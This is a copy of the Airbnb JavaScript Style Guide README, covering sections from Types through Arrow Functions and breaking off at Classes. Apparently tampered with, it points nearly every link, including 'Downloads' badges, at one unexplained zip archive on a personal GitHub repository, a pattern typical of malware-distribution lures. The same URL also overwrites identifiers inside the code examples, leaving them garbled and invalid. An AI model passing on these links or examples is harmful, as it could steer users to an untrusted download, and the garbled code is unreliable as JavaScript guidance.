# Airbnb JavaScript Style Guide() {

*A mostly reasonable approach to JavaScript*

[![Downloads](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
[![Downloads](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
[![Gitter](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

Other Style Guides
 - [ES5 (Deprecated)](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
 - [React](react/)
 - [CSS-in-JavaScript](css-in-javascript/)
 - [CSS & Sass](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
 - [Ruby](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

## Table of Contents

  1. [Types](#types)
  1. [References](#references)
  1. [Objects](#objects)
  1. [Arrays](#arrays)
  1. [Destructuring](#destructuring)
  1. [Strings](#strings)
  1. [Functions](#functions)
  1. [Arrow Functions](#arrow-functions)
  1. [Classes & Constructors](#classes--constructors)
  1. [Modules](#modules)
  1. [Iterators and Generators](#iterators-and-generators)
  1. [Properties](#properties)
  1. [Variables](#variables)
  1. [Hoisting](#hoisting)
  1. [Comparison Operators & Equality](#comparison-operators--equality)
  1. [Blocks](#blocks)
  1. [Comments](#comments)
  1. [Whitespace](#whitespace)
  1. [Commas](#commas)
  1. [Semicolons](#semicolons)
  1. [Type Casting & Coercion](#type-casting--coercion)
  1. [Naming Conventions](#naming-conventions)
  1. [Accessors](#accessors)
  1. [Events](#events)
  1. [jQuery](#jquery)
  1. [ECMAScript 5 Compatibility](#ecmascript-5-compatibility)
  1. [ECMAScript 6+ (ES 2015+) Styles](#ecmascript-6-es-2015-styles)
  1. [Testing](#testing)
  1. [Performance](#performance)
  1. [Resources](#resources)
  1. [In the Wild](#in-the-wild)
  1. [Translation](#translation)
  1. [The JavaScript Style Guide Guide](#the-javascript-style-guide-guide)
  1. [Chat With Us About JavaScript](#chat-with-us-about-javascript)
  1. [Contributors](#contributors)
  1. [License](#license)

## Types

  <a name="types--primitives"></a><a name="1.1"></a>
  - [1.1](#types--primitives) **Primitives**: When you access a primitive type you work directly on its value.

    + `string`
    + `number`
    + `boolean`
    + `null`
    + `undefined`

    ```javascript
    const foo = 1;
    let bar = foo;

    bar = 9;

    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo, bar); // => 1, 9
    ```

  <a name="types--complex"></a><a name="1.2"></a>
  - [1.2](#types--complex)  **Complex**: When you access a complex type you work on a reference to its value.

    + `object`
    + `array`
    + `function`

    ```javascript
    const foo = [1, 2];
    const bar = foo;

    bar[0] = 9;

    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo[0], bar[0]); // => 9, 9
    ```

**[⬆ back to top](#table-of-contents)**

## References

  <a name="references--prefer-const"></a><a name="2.1"></a>
  - [2.1](#references--prefer-const) Use `const` for all of your references; avoid using `var`. eslint: [`prefer-const`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), [`no-const-assign`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? This ensures that you can't reassign your references, which can lead to bugs and difficult to comprehend code.

    ```javascript
    // bad
    var a = 1;
    var b = 2;

    // good
    const a = 1;
    const b = 2;
    ```

  <a name="references--disallow-var"></a><a name="2.2"></a>
  - [2.2](#references--disallow-var) If you must reassign references, use `let` instead of `var`. eslint: [`no-var`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`disallowVar`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? `let` is block-scoped rather than function-scoped like `var`.

    ```javascript
    // bad
    var count = 1;
    if (true) {
      count += 1;
    }

    // good, use the let.
    let count = 1;
    if (true) {
      count += 1;
    }
    ```

  <a name="references--block-scope"></a><a name="2.3"></a>
  - [2.3](#references--block-scope) Note that both `let` and `const` are block-scoped.

    ```javascript
    // const and let only exist in the blocks they are defined in.
    {
      let a = 1;
      const b = 1;
    }
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(a); // ReferenceError
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(b); // ReferenceError
    ```

**[⬆ back to top](#table-of-contents)**

## Objects

  <a name="objects--no-new"></a><a name="3.1"></a>
  - [3.1](#objects--no-new) Use the literal syntax for object creation. eslint: [`no-new-object`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    const item = new Object();

    // good
    const item = {};
    ```

  <a name="es6-computed-properties"></a><a name="3.4"></a>
  - [3.4](#es6-computed-properties) Use computed property names when creating objects with dynamic property names.

    > Why? They allow you to define all the properties of an object in one place.

    ```javascript

    function getKey(k) {
      return `a key named ${k}`;
    }

    // bad
    const obj = {
      id: 5,
      name: 'San Francisco',
    };
    obj[getKey('enabled')] = true;

    // good
    const obj = {
      id: 5,
      name: 'San Francisco',
      [getKey('enabled')]: true,
    };
    ```

  <a name="es6-object-shorthand"></a><a name="3.5"></a>
  - [3.5](#es6-object-shorthand) Use object method shorthand. eslint: [`object-shorthand`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireEnhancedObjectLiterals`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    const atom = {
      value: 1,

      addValue: function (value) {
        return https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip + value;
      },
    };

    // good
    const atom = {
      value: 1,

      addValue(value) {
        return https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip + value;
      },
    };
    ```

  <a name="es6-object-concise"></a><a name="3.6"></a>
  - [3.6](#es6-object-concise) Use property value shorthand. eslint: [`object-shorthand`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireEnhancedObjectLiterals`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? It is shorter to write and descriptive.

    ```javascript
    const lukeSkywalker = 'Luke Skywalker';

    // bad
    const obj = {
      lukeSkywalker: lukeSkywalker,
    };

    // good
    const obj = {
      lukeSkywalker,
    };
    ```

  <a name="objects--grouped-shorthand"></a><a name="3.7"></a>
  - [3.7](#objects--grouped-shorthand) Group your shorthand properties at the beginning of your object declaration.

    > Why? It's easier to tell which properties are using the shorthand.

    ```javascript
    const anakinSkywalker = 'Anakin Skywalker';
    const lukeSkywalker = 'Luke Skywalker';

    // bad
    const obj = {
      episodeOne: 1,
      twoJediWalkIntoACantina: 2,
      lukeSkywalker,
      episodeThree: 3,
      mayTheFourth: 4,
      anakinSkywalker,
    };

    // good
    const obj = {
      lukeSkywalker,
      anakinSkywalker,
      episodeOne: 1,
      twoJediWalkIntoACantina: 2,
      episodeThree: 3,
      mayTheFourth: 4,
    };
    ```

  <a name="objects--quoted-props"></a><a name="3.8"></a>
  - [3.8](#objects--quoted-props) Only quote properties that are invalid identifiers. eslint: [`quote-props`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`disallowQuotedKeysInObjects`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

  > Why? In general we consider it subjectively easier to read. It improves syntax highlighting, and is also more easily optimized by many JS engines.

  ```javascript
  // bad
  const bad = {
    'foo': 3,
    'bar': 4,
    'data-blah': 5,
  };

  // good
  const good = {
    foo: 3,
    bar: 4,
    'data-blah': 5,
  };
  ```

  <a name="objects--prototype-builtins"></a>
  - [3.9](#objects--prototype-builtins) Do not call `https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip` methods directly, such as `hasOwnProperty`, `propertyIsEnumerable`, and `isPrototypeOf`.

  > Why? These methods may be shadowed by properties on the object in question - consider `{ hasOwnProperty: false }` - or, the object may be a null object (`https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(null)`).

  ```javascript
  // bad
  https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(key));

  // good
  https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(object, key));

  // best
  const has = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip; // cache the lookup once, in module scope.
  /* or */
  const has = require('has');
  …
  https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(object, key));
  ```

**[⬆ back to top](#table-of-contents)**

## Arrays

  <a name="arrays--literals"></a><a name="4.1"></a>
  - [4.1](#arrays--literals) Use the literal syntax for array creation. eslint: [`no-array-constructor`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    const items = new Array();

    // good
    const items = [];
    ```

  <a name="arrays--push"></a><a name="4.2"></a>
  - [4.2](#arrays--push) Use [Array#push](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) instead of direct assignment to add items to an array.

    ```javascript
    const someStack = [];

    // bad
    someStack[https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip] = 'abracadabra';

    // good
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('abracadabra');
    ```

  <a name="es6-array-spreads"></a><a name="4.3"></a>
  - [4.3](#es6-array-spreads) Use array spreads `...` to copy arrays.

    ```javascript
    // bad
    const len = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
    const itemsCopy = [];
    let i;

    for (i = 0; i < len; i++) {
      itemsCopy[i] = items[i];
    }

    // good
    const itemsCopy = [https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip];
    ```

  <a name="arrays--from"></a><a name="4.4"></a>
  - [4.4](#arrays--from) To convert an array-like object to an array, use [https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).

    ```javascript
    const foo = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('.foo');
    const nodes = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(foo);
    ```

  <a name="arrays--callback-return"></a><a name="4.5"></a>
  - [4.5](#arrays--callback-return) Use return statements in array method callbacks. It's ok to omit the return if the function body consists of a single statement following [8.2](#8.2). eslint: [`array-callback-return`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // good
    [1, 2, 3].map((x) => {
      const y = x + 1;
      return x * y;
    });

    // good
    [1, 2, 3].map(x => x + 1);

    // bad
    const flat = {};
    [[0, 1], [2, 3], [4, 5]].reduce((memo, item, index) => {
      const flatten = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(item);
      flat[index] = flatten;
    });

    // good
    const flat = {};
    [[0, 1], [2, 3], [4, 5]].reduce((memo, item, index) => {
      const flatten = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(item);
      flat[index] = flatten;
      return flatten;
    });

    // bad
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip((msg) => {
      const { subject, author } = msg;
      if (subject === 'Mockingbird') {
        return author === 'Harper Lee';
      } else {
        return false;
      }
    });

    // good
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip((msg) => {
      const { subject, author } = msg;
      if (subject === 'Mockingbird') {
        return author === 'Harper Lee';
      }

      return false;
    });
    ```

**[⬆ back to top](#table-of-contents)**

## Destructuring

  <a name="destructuring--object"></a><a name="5.1"></a>
  - [5.1](#destructuring--object) Use object destructuring when accessing and using multiple properties of an object. jscs: [`requireObjectDestructuring`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? Destructuring saves you from creating temporary references for those properties.

    ```javascript
    // bad
    function getFullName(user) {
      const firstName = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
      const lastName = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;

      return `${firstName} ${lastName}`;
    }

    // good
    function getFullName(user) {
      const { firstName, lastName } = user;
      return `${firstName} ${lastName}`;
    }

    // best
    function getFullName({ firstName, lastName }) {
      return `${firstName} ${lastName}`;
    }
    ```

  <a name="destructuring--array"></a><a name="5.2"></a>
  - [5.2](#destructuring--array) Use array destructuring. jscs: [`requireArrayDestructuring`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    const arr = [1, 2, 3, 4];

    // bad
    const first = arr[0];
    const second = arr[1];

    // good
    const [first, second] = arr;
    ```

  <a name="destructuring--object-over-array"></a><a name="5.3"></a>
  - [5.3](#destructuring--object-over-array) Use object destructuring for multiple return values, not array destructuring. jscs: [`disallowArrayDestructuringReturn`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? You can add new properties over time or change the order of things without breaking call sites.

    ```javascript
    // bad
    function processInput(input) {
      // then a miracle occurs
      return [left, right, top, bottom];
    }

    // the caller needs to think about the order of return data
    const [left, __, top] = processInput(input);

    // good
    function processInput(input) {
      // then a miracle occurs
      return { left, right, top, bottom };
    }

    // the caller selects only the data they need
    const { left, top } = processInput(input);
    ```


**[⬆ back to top](#table-of-contents)**

## Strings

  <a name="strings--quotes"></a><a name="6.1"></a>
  - [6.1](#strings--quotes) Use single quotes `''` for strings. eslint: [`quotes`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`validateQuoteMarks`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```javascript
    // bad
    const name = "Capt. Janeway";

    // bad - template literals should contain interpolation or newlines
    const name = `Capt. Janeway`;

    // good
    const name = 'Capt. Janeway';
    ```

  <a name="strings--line-length"></a><a name="6.2"></a>
  - [6.2](#strings--line-length) Strings that cause the line to go over 100 characters should not be written across multiple lines using string concatenation.

    > Why? Broken strings are painful to work with and make code less searchable.

    ```javascript
    // bad
    const errorMessage = 'This is a super long error that was thrown because \
    of Batman. When you stop to think about how Batman had anything to do \
    with this, you would get nowhere \
    fast.';

    // bad
    const errorMessage = 'This is a super long error that was thrown because ' +
      'of Batman. When you stop to think about how Batman had anything to do ' +
      'with this, you would get nowhere fast.';

    // good
    const errorMessage = 'This is a super long error that was thrown because of Batman. When you stop to think about how Batman had anything to do with this, you would get nowhere fast.';
    ```

  <a name="es6-template-literals"></a><a name="6.4"></a>
  - [6.4](#es6-template-literals) When programmatically building up strings, use template strings instead of concatenation. eslint: [`prefer-template`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) [`template-curly-spacing`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireTemplateStrings`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? Template strings give you a readable, concise syntax with proper newlines and string interpolation features.

    ```javascript
    // bad
    function sayHi(name) {
      return 'How are you, ' + name + '?';
    }

    // bad
    function sayHi(name) {
      return ['How are you, ', name, '?'].join();
    }

    // bad
    function sayHi(name) {
      return `How are you, ${ name }?`;
    }

    // good
    function sayHi(name) {
      return `How are you, ${name}?`;
    }
    ```

  <a name="strings--eval"></a><a name="6.5"></a>
  - [6.5](#strings--eval) Never use `eval()` on a string, it opens too many vulnerabilities.

  <a name="strings--escaping"></a>
  - [6.6](#strings--escaping) Do not unnecessarily escape characters in strings. eslint: [`no-useless-escape`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? Backslashes harm readability, thus they should only be present when necessary.

    ```javascript
    // bad
    const foo = '\'this\' \i\s \"quoted\"';

    // good
    const foo = '\'this\' is "quoted"';
    const foo = `'this' is "quoted"`;
    ```

**[⬆ back to top](#table-of-contents)**


## Functions

  <a name="functions--declarations"></a><a name="7.1"></a>
  - [7.1](#functions--declarations) Use named function expressions instead of function declarations. eslint: [`func-style`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireFunctionDeclarations`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? Function declarations are hoisted, which means that it’s easy - too easy - to reference the function before it is defined in the file. This harms readability and maintainability. If you find that a function’s definition is large or complex enough that it is interfering with understanding the rest of the file, then perhaps it’s time to extract it to its own module! Don’t forget to name the expression - anonymous functions can make it harder to locate the problem in an Error's call stack.

    ```javascript
    // bad
    const foo = function () {
    };

    // bad
    function foo() {
    }

    // good
    const foo = function bar() {
    };
    ```

  <a name="functions--iife"></a><a name="7.2"></a>
  - [7.2](#functions--iife) Wrap immediately invoked function expressions in parentheses. eslint: [`wrap-iife`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireParenthesesAroundIIFE`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? An immediately invoked function expression is a single unit - wrapping both it, and its invocation parens, in parens, cleanly expresses this. Note that in a world with modules everywhere, you almost never need an IIFE.

    ```javascript
    // immediately-invoked function expression (IIFE)
    (function () {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Welcome to the Internet. Please follow me.');
    }());
    ```

  <a name="functions--in-blocks"></a><a name="7.3"></a>
  - [7.3](#functions--in-blocks) Never declare a function in a non-function block (if, while, etc). Assign the function to a variable instead. Browsers will allow you to do it, but they all interpret it differently, which is bad news bears. eslint: [`no-loop-func`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

  <a name="functions--note-on-blocks"></a><a name="7.4"></a>
  - [7.4](#functions--note-on-blocks) **Note:** ECMA-262 defines a `block` as a list of statements. A function declaration is not a statement. [Read ECMA-262's note on this issue](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).

    ```javascript
    // bad
    if (currentUser) {
      function test() {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Nope.');
      }
    }

    // good
    let test;
    if (currentUser) {
      test = () => {
        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('Yup.');
      };
    }
    ```

  <a name="functions--arguments-shadow"></a><a name="7.5"></a>
  - [7.5](#functions--arguments-shadow) Never name a parameter `arguments`. This will take precedence over the `arguments` object that is given to every function scope.

    ```javascript
    // bad
    function nope(name, options, arguments) {
      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
    }

    // good
    function yup(name, options, args) {
      // https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
    }
    ```

  <a name="es6-rest"></a><a name="7.6"></a>
  - [7.6](#es6-rest) Never use `arguments`, opt to use rest syntax `...` instead. eslint: [`prefer-rest-params`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? `...` is explicit about which arguments you want pulled. Plus, rest arguments are a real Array, and not merely Array-like like `arguments`.

    ```javascript
    // bad
    function concatenateAll() {
      const args = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(arguments);
      return https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('');
    }

    // good
    function concatenateAll(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) {
      return https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('');
    }
    ```

  <a name="es6-default-parameters"></a><a name="7.7"></a>
  - [7.7](#es6-default-parameters) Use default parameter syntax rather than mutating function arguments.

    ```javascript
    // really bad
    function handleThings(opts) {
      // No! We shouldn't mutate function arguments.
      // Double bad: if opts is falsy it'll be set to an object which may
      // be what you want but it can introduce subtle bugs.
      opts = opts || {};
      // ...
    }

    // still bad
    function handleThings(opts) {
      if (opts === void 0) {
        opts = {};
      }
      // ...
    }

    // good
    function handleThings(opts = {}) {
      // ...
    }
    ```

  <a name="functions--default-side-effects"></a><a name="7.8"></a>
  - [7.8](#functions--default-side-effects) Avoid side effects with default parameters.

    > Why? They are confusing to reason about.

    ```javascript
    var b = 1;
    // bad
    function count(a = b++) {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(a);
    }
    count();  // 1
    count();  // 2
    count(3); // 3
    count();  // 3
    ```

  <a name="functions--defaults-last"></a><a name="7.9"></a>
  - [7.9](#functions--defaults-last) Always put default parameters last.

    ```javascript
    // bad
    function handleThings(opts = {}, name) {
      // ...
    }

    // good
    function handleThings(name, opts = {}) {
      // ...
    }
    ```

  <a name="functions--constructor"></a><a name="7.10"></a>
  - [7.10](#functions--constructor) Never use the Function constructor to create a new function. eslint: [`no-new-func`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? Creating a function in this way evaluates a string similarly to eval(), which opens vulnerabilities.

    ```javascript
    // bad
    var add = new Function('a', 'b', 'return a + b');

    // still bad
    var subtract = Function('a', 'b', 'return a - b');
    ```

  <a name="functions--signature-spacing"></a><a name="7.11"></a>
  - [7.11](#functions--signature-spacing) Spacing in a function signature. eslint: [`space-before-function-paren`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) [`space-before-blocks`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? Consistency is good, and you shouldn’t have to add or remove a space when adding or removing a name.

    ```javascript
    // bad
    const f = function(){};
    const g = function (){};
    const h = function() {};

    // good
    const x = function () {};
    const y = function a() {};
    ```

  <a name="functions--mutate-params"></a><a name="7.12"></a>
  - [7.12](#functions--mutate-params) Never mutate parameters. eslint: [`no-param-reassign`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? Manipulating objects passed in as parameters can cause unwanted variable side effects in the original caller.

    ```javascript
    // bad
    function f1(obj) {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = 1;
    };

    // good
    function f2(obj) {
      const key = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(obj, 'key') ? https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip : 1;
    };
    ```

  <a name="functions--reassign-params"></a><a name="7.13"></a>
  - [7.13](#functions--reassign-params) Never reassign parameters. eslint: [`no-param-reassign`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? Reassigning parameters can lead to unexpected behavior, especially when accessing the `arguments` object. It can also cause optimization issues, especially in V8.

    ```javascript
    // bad
    function f1(a) {
      a = 1;
    }

    function f2(a) {
      if (!a) { a = 1; }
    }

    // good
    function f3(a) {
      const b = a || 1;
    }

    function f4(a = 1) {
    }
    ```

  <a name="functions--spread-vs-apply"></a><a name="7.14"></a>
  - [7.14](#functions--spread-vs-apply) Prefer the use of the spread operator `...` to call variadic functions. eslint: [`prefer-spread`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? It's cleaner, you don't need to supply a context, and you can not easily compose `new` with `apply`.

    ```javascript
    // bad
    const x = [1, 2, 3, 4, 5];
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(console, x);

    // good
    const x = [1, 2, 3, 4, 5];
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(...x);

    // bad
    new (https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(Date, [null, 2016, 08, 05]));

    // good
    new Date(...[2016, 08, 05]);
    ```

**[⬆ back to top](#table-of-contents)**

## Arrow Functions

  <a name="arrows--use-them"></a><a name="8.1"></a>
  - [8.1](#arrows--use-them) When you must use function expressions (as when passing an anonymous function), use arrow function notation. eslint: [`prefer-arrow-callback`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), [`arrow-spacing`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireArrowFunctions`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? It creates a version of the function that executes in the context of `this`, which is usually what you want, and is a more concise syntax.

    > Why not? If you have a fairly complicated function, you might move that logic out into its own function declaration.

    ```javascript
    // bad
    [1, 2, 3].map(function (x) {
      const y = x + 1;
      return x * y;
    });

    // good
    [1, 2, 3].map((x) => {
      const y = x + 1;
      return x * y;
    });
    ```

  <a name="arrows--implicit-return"></a><a name="8.2"></a>
  - [8.2](#arrows--implicit-return) If the function body consists of a single expression, omit the braces and use the implicit return. Otherwise, keep the braces and use a `return` statement. eslint: [`arrow-parens`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), [`arrow-body-style`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs:  [`disallowParenthesesAroundArrowParam`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), [`requireShorthandArrowFunctions`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? Syntactic sugar. It reads well when multiple functions are chained together.

    ```javascript
    // bad
    [1, 2, 3].map(number => {
      const nextNumber = number + 1;
      `A string containing the ${nextNumber}.`;
    });

    // good
    [1, 2, 3].map(number => `A string containing the ${number}.`);

    // good
    [1, 2, 3].map((number) => {
      const nextNumber = number + 1;
      return `A string containing the ${nextNumber}.`;
    });

    // good
    [1, 2, 3].map((number, index) => ({
      index: number
    }));
    ```

  <a name="arrows--paren-wrap"></a><a name="8.3"></a>
  - [8.3](#arrows--paren-wrap) In case the expression spans over multiple lines, wrap it in parentheses for better readability.

    > Why? It shows clearly where the function starts and ends.

    ```js
    // bad
    ['get', 'post', 'put'].map(httpMethod => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(
        httpMagicObjectWithAVeryLongName,
        httpMethod
      )
    );

    // good
    ['get', 'post', 'put'].map(httpMethod => (
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(
        httpMagicObjectWithAVeryLongName,
        httpMethod
      )
    ));
    ```

  <a name="arrows--one-arg-parens"></a><a name="8.4"></a>
  - [8.4](#arrows--one-arg-parens) If your function takes a single argument and doesn’t use braces, omit the parentheses. Otherwise, always include parentheses around arguments. eslint: [`arrow-parens`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs:  [`disallowParenthesesAroundArrowParam`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    > Why? Less visual clutter.

    ```js
    // bad
    [1, 2, 3].map((x) => x * x);

    // good
    [1, 2, 3].map(x => x * x);

    // good
    [1, 2, 3].map(number => (
      `A long string with the ${number}. It’s so long that we’ve broken it ` +
      'over multiple lines!'
    ));

    // bad
    [1, 2, 3].map(x => {
      const y = x + 1;
      return x * y;
    });

    // good
    [1, 2, 3].map((x) => {
      const y = x + 1;
      return x * y;
    });
    ```

  <a name="arrows--confusing"></a><a name="8.5"></a>
  - [8.5](#arrows--confusing) Avoid confusing arrow function syntax (`=>`) with comparison operators (`<=`, `>=`). eslint: [`no-confusing-arrow`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

    ```js
    // bad
    const itemHeight = item => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip > 256 ? https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip : https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;

    // bad
    const itemHeight = (item) => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip > 256 ? https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip : https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;

    // good
    const itemHeight = item => (https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip > 256 ? https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip : https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip);

    // good
    const itemHeight = (item) => {
      const { height, largeSize, smallSize } = item;
      return height > 256 ? largeSize : smallSize;
    };
    ```

**[⬆ back to top](#table-of-contents)**


## Classes & Constructors

  <a name="constructors--use-class"></a><a name="9.1"></a>
  - [9.1](#constructors--use-class) Always use `class`. Avoid manipulating `prototype` directly.

    > Why? `class` syntax is more concise and easier to reason about.

    ```javascript
    // bad
    function Queue(contents = []) {
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = [https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip];
    }
    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = function () {
      const value = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip[0];
      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(0, 1);
      return value;
    };


    // good
    class Queue {
